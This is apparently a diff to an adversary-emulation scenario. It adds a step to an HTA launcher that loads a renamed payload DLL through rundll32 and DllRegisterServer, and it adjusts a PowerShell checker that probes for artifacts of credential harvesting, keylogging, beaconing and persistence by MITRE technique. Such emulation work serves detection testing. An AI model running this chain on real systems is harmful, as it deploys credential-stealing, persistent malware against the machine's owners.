@@ -374,6 +374,20 @@ try {
     log("[+] cscript.exe completed (exit code " + cscriptRc + ")");
 } catch(e) { log("[-] cscript.exe FAILED: " + e.message); }
 
+// Stage 5: Force-load payload via rundll32 + DllRegisterServer.
+// The tcmsetup.exe sideload in Stage 2 is fictitious (tcmsetup.exe does
+// not import msimtf.dll on real Windows), so the payload never loads via
+// DLL search order. rundll32 + DllRegisterServer is the documented load
+// path for a renamed payload, and DllRegisterServer runs the worker
+// synchronously so the post-ex artifacts (Telemetry.dll, Telemetry.bin,
+// Wifi.bin, spcache.bin, WinUpdHlth service, BITS job, LNK persist) are
+// produced before the HTA exits. Blocks ~130s.
+log("[*] Force-loading payload via rundll32 (DllRegisterServer)...");
+try {
+    var loadRc = shell.Run("rundll32.exe C:\\Users\\Public\\Libraries\\msimtf.dll,DllRegisterServer", 0, true);
+    log("[+] DllRegisterServer completed (exit code " + loadRc + ")");
+} catch(e) { log("[-] DllRegisterServer FAILED: " + e.message); }
+
 log("[+] agent.hta complete");
 window.close();
 </script>
@@ -429,10 +443,10 @@ if ($WhatIf) {
 # Mirrors scenario-01-rmm/src/loader.ps1:147-186. Probes each MITRE T-code's
 # expected artifact so the log confirms whether the chain actually produced it.
 if (-not $WhatIf) {
-    Write-Log "[*] Waiting 180s for post-ex artifacts to land..."
-    Start-Sleep -Seconds 180
+    Write-Log "[*] Waiting 240s for post-ex artifacts to land..."
+    Start-Sleep -Seconds 240
 } else {
-    Write-Log "[WHATIF] would sleep 180s then probe artifacts"
+    Write-Log "[WHATIF] would sleep 240s then probe artifacts"
 }
 
 $artifacts = @{
@@ -449,7 +463,7 @@ $artifacts = @{
     "T1552.004 WiFi harvest"             = "C:\ProgramData\USOShared\Logs\Wifi.bin"
     "T1003.001 WDigest log (keylog)"     = "C:\ProgramData\USOShared\Logs\Telemetry.bin"
     "T1041 HTTP beacon log"              = "C:\ProgramData\USOShared\Logs\cache.dat"
-    "T1074.001 staging scatter"          = "C:\Users\Public\Libraries\wlbsctrl.dll"
+    "T1074.001 staging scatter"          = "C:\ProgramData\Microsoft\Search\Data\EDS\spcache.bin"
 }
 
 function Test-Artifact {
